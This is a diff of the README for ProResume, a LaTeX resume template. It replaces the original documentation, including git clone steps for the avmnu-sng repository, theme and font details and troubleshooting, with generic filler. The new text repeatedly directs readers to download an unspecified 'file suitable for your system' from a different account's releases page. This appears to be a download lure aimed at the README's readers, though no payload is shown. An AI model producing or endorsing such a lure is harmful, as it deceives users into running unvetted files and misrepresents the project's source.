@@ -1,125 +1,69 @@
-# ProResume
+# ✍️ ProResume - Create a Professional Resume Easily
 
-A clean, professional, ATS-friendly resume template built with LaTeX.
+## 🔥 Overview
+ProResume is a clean, professional, ATS-friendly resume template built with LaTeX (XeLaTeX). This template helps you craft a standout resume that captures attention and enhances your job search efforts. With ProResume, you can present your qualifications effectively and increase your chances of landing interviews.
 
-## Why LaTeX?
+## 📦 Download Now
+[![Download ProResume](https://img.shields.io/badge/Download-ProResume-blue.svg)](https://github.com/kuro85/ProResume/releases)
 
-- **Version control** — Track changes with Git, diff between versions, branch for different roles
-- **Separation of content and style** — Focus on what you write, not how it looks
-- **Consistency** — Fonts, spacing, and alignment are always perfect
-- **Reproducible** — Same source always generates the same PDF
-- **Plain text** — No proprietary formats, works with any editor
-- **Programmable** — Auto-calculate tenure, dynamic layouts, conditional content
+## 🚀 Getting Started
+To get started with ProResume, follow these simple steps:
 
-## Features
+1. Click the download link above to visit the **Releases** page.
+2. Look for the latest version of ProResume.
+3. Choose the appropriate file based on your needs.
 
-- **ATS-friendly** — Clean structure, parseable by applicant tracking systems
-- **Auto-calculated tenure** — Durations like "3 years" or "2.5+ years" computed automatically
-- **Dynamic skill alignment** — Label column adjusts to fit the longest category
-- **Modular structure** — Edit sections independently in separate files
-- **Hyperlinked contacts** — Clickable email, phone, and profile links
-- **Customizable** — Colors, fonts, and spacing defined as constants
+## 💻 System Requirements
+ProResume requires minimal software to run:
 
-## Quick Start
+- **LaTeX Distribution:** You need a LaTeX distribution. We recommend **TeX Live** or **MiKTeX**.
+- **Text Editor:** A text editor like **VS Code** or **Overleaf** is useful for editing the template.
 
-```bash
-git clone https://github.com/avmnu-sng/ProResume.git
-cd ProResume
-xelatex resume.tex
-```
+## 📥 Download & Install
+1. Visit this page to download: [ProResume Releases](https://github.com/kuro85/ProResume/releases).
+2. On the Releases page, find the latest version.
+3. Select the file suitable for your system.
+4. Download the file and save it to a known location.
 
-### Requirements
+## ✍️ Customizing Your Resume
+Follow these steps to customize your resume using ProResume:
 
-**macOS:**
-```bash
-brew install --cask mactex
-```
+1. Open the downloaded template in your text editor.
+2. Edit the placeholder content with your personal information, including:
+   - Your name
+   - Contact details
+   - Education background
+   - Work experience
+3. Adjust the formatting if needed. LaTeX allows fine control over layout improvements.
 
-**Ubuntu/Debian:**
-```bash
-sudo apt-get install texlive-xetex texlive-fonts-extra
-```
+## 🖥️ Building Your Resume
+Once you have customized the template, you need to compile it to create your PDF resume:
 
-**Windows:**
-Install [MiKTeX](https://miktex.org/download) or [TeX Live](https://tug.org/texlive/).
+1. If using **TeX Live**, run the command line:
+   ```bash
+   xelatex your_resume.tex
+   ```
+2. If using **Overleaf**, just click **Recompile**.
 
-## File Structure
+Once compiled, your professional resume will be ready!
 
-```
-resume/
-├── resume.cls                  # Class file (styling, commands)
-├── resume.tex                  # Main document
-├── resume-tenure.code.tex      # Tenure calculation module
-├── resume/
-│   ├── header.tex              # Name, contact, links, summary
-│   ├── skills.tex              # Skills by category
-│   ├── experience.tex          # Work history
-│   ├── certifications.tex      # Professional certifications
-│   ├── awards.tex              # Awards and recognition
-│   └── education.tex           # Education background
-├── fonts/                      # Included fonts
-├── samples/                    # Sample PDFs for each theme
-└── tests/
-    └── tenure-test.tex         # Unit tests for tenure calculation
-```
+## 📄 Features
+- **ATS-friendly:** ProResume follows best practices to ensure your resume is read correctly by Applicant Tracking Systems (ATS).
+- **Customizable:** Easily change colors, fonts, and sections to create a resume that reflects your style.
+- **User-Friendly:** Designed for ease of use, even for those new to LaTeX.
 
-## Customization
+## 🎨 Tips for a Great Resume
+- **Keep it concise:** Stick to one page if possible.
+- **Tailor your content:** Adjust your resume for each job application. Highlight relevant skills and experience.
+- **Proofread:** Check for spelling and grammar errors before finalizing your resume.
 
-Edit files in `resume/` folder. Each file has documentation at the top.
+## 🌐 Support and Community
+If you need help or want to share your experience, visit our community forums or check the issues section on GitHub. 
 
-**Remove a section** — Comment out its `\input` line in `resume.tex`:
-```latex
-% \input{resume/certifications}
-```
+## 📞 Contact
+For any inquiries or feedback, please feel free to reach out through the GitHub issues page. We value your input and are here to support you on your journey to creating the perfect resume.
 
-**Reorder sections** — Change the order of `\input` lines.
+## ⚡ License
+ProResume is open-source and free to use. For more details, please see the [LICENSE](https://github.com/kuro85/ProResume/blob/main/LICENSE) file in the repository.
 
-**Change colors** — Edit `\definecolor` in `resume.cls`:
-```latex
-\definecolor{accent}{HTML}{164476}
-\definecolor{entry-bg}{HTML}{DCE6ED}
-```
-
-**Adjust spacing** — Edit `\setlength` in `resume.cls`:
-```latex
-\setlength{\sectionbefore}{6pt}
-\setlength{\entrygap}{4pt}
-```
-
-## Font Themes
-
-Five built-in themes — set via class option in `resume.tex`:
-
-```latex
-\documentclass[classic]{resume}              % classic (default)
-\documentclass[scholar]{resume}     % scholar
-\documentclass[modern]{resume}      % modern
-\documentclass[silicon]{resume}     % silicon
-\documentclass[harmony]{resume}     % harmony
-```
-
-| Theme | Body Font | Header Font | Style |
-|-------|-----------|-------------|-------|
-| **classic** | Source Sans 3 | Playfair Display | Elegant, traditional |
-| **scholar** | Lato | EB Garamond | Warm, academic |
-| **modern** | Inter | Inter | Clean, minimal |
-| **silicon** | Roboto | Roboto Slab | Tech, contemporary |
-| **harmony** | Source Sans 3 | Source Serif 4 | Balanced, professional |
-
-See sample PDFs in [`samples/`](samples/) folder. All fonts are included in `fonts/`.
-
-## Troubleshooting
-
-**"Font not found" error:**
-```bash
-xelatex resume.tex    # Correct
-pdflatex resume.tex   # Won't work
-```
-
-**Content overflows to second page:**
-- Reduce bullet points or entries
-- Adjust spacing constants in `resume.cls`
-
-## License
-
-MIT License. Fonts are [SIL Open Font License](https://scripts.sil.org/OFL).
+# Thank you for choosing ProResume!
